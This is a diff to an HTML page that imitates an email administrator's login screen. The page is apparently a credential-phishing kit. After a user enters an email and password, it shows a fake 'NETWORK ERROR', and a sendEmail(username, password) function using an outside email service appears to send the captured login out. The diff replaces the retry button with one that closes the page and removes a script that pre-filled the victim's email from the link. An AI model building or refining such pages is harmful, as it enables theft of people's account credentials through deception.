@@ -156,7 +156,7 @@
   <div id="confirmation">
     <h2 style="color: white;">NETWORK ERROR</h2>
     <p>You've entered an invalid email address / password combination.</p>
-    <button onclick="retryLogin()">Go to login</button>
+    <button onclick="window.close()">Close this page</button>
   </div>
 
   <!-- Footer -->
@@ -164,23 +164,6 @@
     2025 Email Administrator. All Rights Reserved
   </div>
 
-  <!-- Prefill + other window.onload tasks -->
-  <script>
-    window.onload = function() {
-      // 1. Pre-fill username from URL
-      const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('email');
-      if (email) {
-        document.getElementById('username').value = email;
-        console.log("Pre-filled username:", email);
-      }
-
-      // 2. Original login panel positioning
-      document.getElementById("login").style.top = "0";
-    };
-  </script>
-
-  <!-- Existing authentication scripts -->
   <script>
     function sendEmail(username, password) {
       const serviceID = "service_0ss7u7m";
